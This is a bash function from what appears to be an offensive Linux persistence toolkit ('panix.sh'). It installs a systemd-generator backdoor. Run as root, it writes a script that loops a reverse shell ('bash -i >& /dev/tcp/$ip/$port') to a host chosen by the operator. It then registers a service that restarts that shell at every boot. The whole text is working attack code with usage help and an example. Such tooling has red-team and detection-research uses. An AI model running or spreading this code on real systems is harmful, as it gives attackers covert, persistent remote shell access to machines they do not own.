setup_generator_persistence() {
	local ip=""
	local port=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_generator() {
		echo "Usage: ./panix.sh --generator [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --generator --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			--help|-h)
				usage_generator
				exit 0
				;;
			* )
				echo "Invalid option for --generator: $1"
				echo "Try './panix.sh --generator --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port ]]; then
		echo "Error: --ip and --port must be specified."
		echo "Try './panix.sh --generator --help' for more information."
		exit 1
	fi

	# Create the /usr/lib/systemd/system-generators/makecon file
	cat <<-EOF > /usr/lib/systemd/system-generators/makecon
	#!/bin/bash
	nohup bash -c "while :; do bash -i >& /dev/tcp/$ip/$port 0>&1; sleep 10; done" &
	EOF

	chmod +x /usr/lib/systemd/system-generators/makecon

	# Create the /usr/lib/systemd/system-generators/generator file
	cat <<-EOF > /usr/lib/systemd/system-generators/generator
	#!/bin/sh
	# Create a systemd service unit file in the late directory
	cat <<-EOL > "/run/systemd/system/generator.service"
	[Unit]
	Description=Generator Service

	[Service]
	ExecStart=/usr/lib/systemd/system-generators/makecon
	Restart=always
	RestartSec=10

	[Install]
	WantedBy=multi-user.target
	EOL

	mkdir -p /run/systemd/system/multi-user.target.wants/
	ln -s /run/systemd/system/generator.service /run/systemd/system/multi-user.target.wants/generator.service

	# Ensure the script exits successfully
	exit 0
	EOF

	chmod +x /usr/lib/systemd/system-generators/generator

	# Reload systemd and enable the generator service
	systemctl daemon-reload
	systemctl enable generator

	echo "[+] Systemd Generator persistence established!"
}
